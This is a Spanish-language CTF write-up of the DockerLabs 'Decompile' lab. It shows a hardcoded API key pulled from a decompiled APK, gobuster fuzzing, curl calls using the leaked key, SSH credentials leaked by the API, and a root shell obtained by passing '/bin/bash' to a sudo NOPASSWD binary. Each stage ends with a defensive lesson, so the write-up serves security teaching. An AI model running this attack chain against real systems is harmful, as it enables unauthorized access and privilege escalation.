# Decompile — DockerLabs

**Plataforma:** DockerLabs
**Categoría:** Web / Reversing / Privilege Escalation
**Dificultad:** Media

## Resumen

`Decompile` es una máquina que combina ingeniería inversa de una APK Android, explotación de una API REST mal protegida y una escalada de privilegios por un binario `sudo` mal configurado. El reto se divide en 4 flags (stage1 a stage4/root), cada una desbloqueando el siguiente paso.

## 1. Reconocimiento inicial — Decompilación de la APK

El punto de entrada del reto es una APK (`app-release.apk`) de una app de alquiler de habitaciones (`com.inmohogar.roomshare`). Se sube a un decompilador online (tipo jadx-web o similar) y se inspecciona la clase `BuildConfig`, un clásico lugar donde desarrolladores dejan secretos hardcodeados por error:

```java
package com.inmohogar.roomshare;

public final class BuildConfig {
    public static final boolean DEBUG = false;
    public static final String APPLICATION_ID = "com.inmohogar.roomshare";
    public static final String BUILD_TYPE = "release";
    public static final int VERSION_CODE = 4711;
    public static final String VERSION_NAME = "3.4.2";
    public static final String BOOKING_API_KEY = "BKGVlytSjDihCgXmNPm1cM6QwhRjrT86yJ2sEaf9";
    public static final String BOOKING_BASE_URL = "https://booking.internal/v3/";
    public static final String TENANT_ACCOUNT = "INMO-MAD-PRIMARY";
    public static final String AUTH_HEADER = "X-API-Key";
    public static final String CTF_STAGE1 = "FLAG{stage1_buildconfig_leak_BKGVlytS}";
}
```

De aquí se obtienen varios datos clave para el resto del reto:

- **FLAG 1:** `FLAG{stage1_buildconfig_leak_BKGVlytS}`
- Una **API key** (`BOOKING_API_KEY`)
- La **URL base** de la API (`BOOKING_BASE_URL`)
- El **header de autenticación** esperado (`X-API-Key`)
- Un **tenant account** (`INMO-MAD-PRIMARY`)

> **Lección:** nunca metas secretos (API keys, tokens, credenciales) en `BuildConfig` ni en recursos empaquetados en el APK — cualquiera con un decompilador los extrae en segundos.

## 2. Enumeración web — Fuzzing de directorios

Con la URL base en mano, se lanza fuzzing sobre el host (`booking.internal`). Un primer barrido revela el directorio `/booking`. Profundizando con `gobuster` sobre ese path aparece el recurso `properties` en varias extensiones, todas devolviendo `401 Unauthorized` (es decir, el endpoint existe pero requiere autenticación):

```
/properties           (Status: 401) [Size: 47]
/properties.txt       (Status: 401) [Size: 47]
/properties.php       (Status: 401) [Size: 47]
/properties.html      (Status: 401) [Size: 47]
/properties.zip       (Status: 401) [Size: 47]
```

El `401` confirma que la API existe y que la clave extraída de la APK es el siguiente paso lógico a probar.

## 3. Explotación de la API — Autenticación y escalada de sesión

### 3.1 Acceso autenticado con la API key

Usando la `BOOKING_API_KEY` filtrada en el header `X-API-Key`:

```bash
curl -H "X-API-Key: BKGVlytSjDihCgXmNPm1cM6QwhRjrT86yJ2sEaf9" \
  http://booking.internal/booking/properties.php
```

Respuesta:

```json
{
  "properties": [
    {"id": "P-001", "address": "Calle Mayor 1, Madrid", "rooms": 3, "monthly_rent_eur": 850},
    {"id": "P-002", "address": "Calle Alcala 100, Madrid", "rooms": 4, "monthly_rent_eur": 1100},
    {"id": "P-003", "address": "Calle Velazquez 50, Madrid", "rooms": 2, "monthly_rent_eur": 720}
  ],
  "_ctf_hint": "Auth OK. Try POST /sessions with tenant_account=INMO-MAD-PRIMARY"
}
```

La API key es válida y, además, la propia respuesta regala el siguiente paso vía `_ctf_hint`: un `POST` a `/sessions` usando el `tenant_account` que también estaba en `BuildConfig`.

### 3.2 Creación de sesión (Stage 2)

```bash
curl -X POST \
  -H "X-API-Key: BKGVlytSjDihCgXmNPm1cM6QwhRjrT86yJ2sEaf9" \
  -H "Content-Type: application/json" \
  -d '{"tenant_account": "INMO-MAD-PRIMARY"}' \
  http://booking.internal/booking/sessions
```

Respuesta:

```json
{
  "id": "SES-EB53493D312D4A43",
  "tenant_account": "INMO-MAD-PRIMARY",
  "property_id": "P-001",
  "reference": "poc-9e0d1a",
  "sessionData": "stage2_accepted_stage2_api_key_accepted_1791913359",
  "status": "open",
  "_ctf_hint": "Auth accepted (Stage 2). Next: SSH user=deploy pwd=c0mpartir-p1s0s"
}
```

- **FLAG 2 (implícita en `sessionData`):** confirma la aceptación de la Stage 2.
- Y de nuevo el `_ctf_hint` entrega credenciales SSH en claro: `deploy:c0mpartir-p1s0s`.

> **Lección:** una API que filtra pistas o credenciales en campos de respuesta (`_ctf_hint`, mensajes de error verbosos) es un patrón real de mala praxis — en producción esto equivale a *information disclosure* por errores de depuración no retirados.

## 4. Acceso SSH y flag de usuario

Con las credenciales `deploy:c0mpartir-p1s0s` se accede por SSH al contenedor:

```bash
ssh deploy@<IP> 
deploy@ca971c659b0c:~$ ls
flag-stage3.txt
```

- **FLAG 3:** contenido de `flag-stage3.txt` (flag de usuario).

## 5. Escalada de privilegios — Abuso de `sudo`

Se comprueban los permisos `sudo` del usuario `deploy`:

```
deploy@ca971c659b0c:~$ sudo -l
Matching Defaults entries for deploy on ca971c659b0c:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User deploy may run the following commands on ca971c659b0c:
    (root) NOPASSWD: /opt/decompile/ssh/privesc/manage-svc
    (ALL) NOPASSWD: /usr/local/bin/restart-booking-gw
```

El usuario `deploy` puede ejecutar **sin contraseña** y como **root** el binario `/opt/decompile/ssh/privesc/manage-svc`. El propio nombre de la ruta (`privesc`) ya es una pista explícita de que este binario es el vector de escalada.

`manage-svc` acepta un argumento que pasa directamente a una shell, lo que permite el clásico abuso de "gestor de servicio" que invoca un intérprete arbitrario:

```bash
deploy@ca971c659b0c:~$ sudo /opt/decompile/ssh/privesc/manage-svc "/bin/bash"
root@ca971c659b0c:~# ls
flag-root.txt
```

Al pasarle `/bin/bash` como argumento, el binario lo ejecuta heredando los privilegios de `root` (por la entrada `NOPASSWD` en `sudoers`), obteniendo una shell interactiva como root.

- **FLAG 4 / root:** contenido de `flag-root.txt`.

> **Lección:** cualquier entrada `sudo NOPASSWD` sobre un binario que internamente invoque un comando, script o intérprete con el input del usuario (sin sanitizar ni fijar el comando) es una escalada de privilegios trivial. La mitigación pasa por: no usar `sudo` para binarios de gestión custom salvo con `argv` fijos y validados, usar `command=` restringido, o eliminar directamente el privilegio `NOPASSWD`.

## 6. Resumen de flags

| Stage | Origen | Técnica |
|---|---|---|
| 1 | `BuildConfig.CTF_STAGE1` en la APK | Decompilación estática de APK / hardcoded secrets |
| 2 | `sessionData` en respuesta de `/sessions` | Abuso de API key filtrada + fuzzing de endpoints |
| 3 | `flag-stage3.txt` (home de `deploy`) | Credenciales SSH filtradas en respuesta de API |
| root | `flag-root.txt` (home de `root`) | Escalada de privilegios vía `sudo` sobre `manage-svc` |

## 7. Conclusiones y lecciones aprendidas

Decompile es un buen ejercicio de **cadena de fallos realista**: cada paso por sí solo parece menor (un secreto en una APK, un endpoint sin rate-limiting, un mensaje de debug verboso, una entrada de `sudoers` demasiado permisiva), pero encadenados llevan de "APK pública" a "root en el servidor" sin necesidad de ningún exploit sofisticado. Las técnicas usadas —decompilación estática, fuzzing de directorios, abuso de API keys y privesc por `sudo`— son representativas de fallos que aparecen con frecuencia en entornos reales, lo que hace de esta máquina un buen caso práctico más allá del propio CTF.
